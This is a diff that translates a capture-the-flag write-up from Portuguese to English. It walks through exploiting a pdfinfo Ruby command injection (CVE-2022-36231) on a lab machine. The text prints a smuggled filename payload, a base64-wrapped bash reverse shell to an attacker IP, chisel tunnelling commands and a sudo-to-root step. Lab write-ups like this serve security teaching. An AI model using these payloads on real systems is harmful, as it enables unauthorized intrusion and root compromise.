@@ -1,20 +1,14 @@
 ---
 title: 'Injection Writeup'
 date: '2024-11-25'
-tags: ['CVE-2022-36231', 'Command Injection', 'Linux']
+tags: ['CVE-2022-36231', 'Command Injection', 'Linux', 'Hacking Club']
 draft: false
-summary: 'A máquina Injection é vulnerável a Command Injection (CVE-2022-36231) e escalonamento de privilégios via sudo.'
+summary: 'The Injection machine is vulnerable to Command Injection (CVE-2022-36231) and privilege escalation via sudo.'
 images: ['/static/images/injection-writeup-images/default.png']
 authors: ['default']
 ---
 
 ![logo](/static/images/injection-writeup-images/default.png)
-
-## **Plataforma**: Hacking Club
-
-### **Dificuldade:** Easy
-
-### **Nome**: Injection
 
 ---
 
@@ -42,7 +36,7 @@ PORT     STATE SERVICE VERSION
 
 ```
 
-Somente as portas 22 (SSH) e 3000 (HTTP) estão abertas.
+Only ports 22 (SSH) and 3000 (HTTP) are open.
 
 ---
 
@@ -50,25 +44,25 @@ Somente as portas 22 (SSH) e 3000 (HTTP) estão abertas.
 
 `http://172.16.4.120:3000`
 
-Se trata de uma aplicação chamada **PDFInfo**, uma aplicação capaz de ler metadados de PDFs.
+This is an application called &&PDFInfo&&, capable of reading PDF metadata.
 
 ![injection](/static/images/injection-writeup-images/image.png)
 
-Quando enviamos um PDF, podemos ver que a aplicação é desenvolvida em ruby:
+When uploading a PDF, we can see that the application is developed in Ruby:
 
 ![injection 1](/static/images/injection-writeup-images/image1.png)
 
-Com isso, se pesquisarmos por **pdfinfo ruby exploit**, vemos existem CVEs associadas.
+By searching for pdfinfo ruby exploit, we find associated CVEs.
 
 [https://github.com/affix/CVE-2022-36231](https://github.com/affix/CVE-2022-36231)
 
 ![injection 2](/static/images/injection-writeup-images/image2.png)
 
-Nesse caso em especifico, temos a vulnerabilidade de **Command Injection.**
+In this specific case, we have a **Command Injection** vulnerability.
 
-Testei o comando `id` , mas não obtive sucesso, o que indica ser um **Command Injection Blind**.
+I tested the `id` command but got no success, indicating a **Blind Command Injection**.
 
-Passando o comando `sleep 5` , vemos que a aplicação demora pra retornar o resultado.
+Using the `sleep 5` command, we observe a delay in the response.
 
 `;$(sleep 5).pdf`
 
@@ -78,7 +72,7 @@ Passando o comando `sleep 5` , vemos que a aplicação demora pra retornar o res
 
 ## Foot Hold
 
-Tentando passar a reverse shell do modo tradicional não funciona, então a alternativa foi encodar a payload em base64 antes de mandar.
+Passing the reverse shell in the traditional way does not work, so the alternative was to encode the payload in base64 before sending.
 
 `echo "bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1234 <&1'" | base64`
 
@@ -90,7 +84,7 @@ Tentando passar a reverse shell do modo tradicional não funciona, então a alte
 
 ## Privillege Escalation
 
-Conseguimos executar o comando `/usr/local/bin/rails server -e development -p 8000` como root.
+We can execute the command `/usr/local/bin/rails server -e development -p 8000` as root.
 
 `sudo -l`
 
@@ -102,13 +96,13 @@ Conseguimos executar o comando `/usr/local/bin/rails server -e development -p 80
 
 ![injection 6](/static/images/injection-writeup-images/image6.png)
 
-Agora como podemos iniciar a aplicação como root, precisamos fazer um _Port Fowarding_ pra acessar a aplicação da nossa maquina.
+Now that we can start the application as root, we need to perform Port Forwarding to access the application from our machine.
 
-O servidor tem o servidor SSH configurado e acessível que podemos utilizar, mas dessa vez utilizei a ferramenta `chisel` .
+The server has an accessible SSH service, but this time I used the **chisel** tool.
 
 [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
 
-Para realizar o _Port Fowarding_, precisamos transferir o `chisel` pra maquina alvo.
+To perform Port Forwarding, we need to transfer **chisel** to the target machine.
 
 `python -m http.server 80`
 
@@ -118,27 +112,27 @@ Para realizar o _Port Fowarding_, precisamos transferir o `chisel` pra maquina a
 
 ![injection 8](/static/images/injection-writeup-images/image8.png)
 
-Após isso, na nossa maquina vamos ligar o servidor do chisel.
+After that, on our machine, we start the chisel server.
 
 `./chisel server -p 9000 --reverse`
 
 ![injection 9](/static/images/injection-writeup-images/image9.png)
 
-Agora na maquina alvo, vamos fazer o _Port Fowarding_.
+Now on the target machine, we perform **Port Forwarding**.
 
-OBS: utilizei duas shells para conseguir realizar.
+Note: I used two shells to execute this successfully.
 
-`sudo /usr/local/bin/rails server -e development -p 8000` #no diretório `/pdf-read-metadata`
+`sudo /usr/local/bin/rails server -e development -p 8000` # in the **/pdf-read-metadata directory**
 
-`./chisel client 10.0.31.150:9000 R:8000:127.0.0.1:8000` #no diretório `/tmp`
+`./chisel client 10.0.31.150:9000 R:8000:127.0.0.1:8000` # in the **/tmp directory**
 
 ![injection 10](/static/images/injection-writeup-images/image10.png)
 
-Com isso, podemos acessar a aplicação da nossa maquina.
+Now we can access the application from our machine.
 
 ![injection 11](/static/images/injection-writeup-images/image11.png)
 
-Agora é só pegar a reverse-shell da mesma maneira utilizada na primeira vez, no entanto, agora vamos entrar como root.
+Now, we just need to get the reverse shell the same way as before, but this time as root.
 
 ![injection 12](/static/images/injection-writeup-images/image12.png)
 
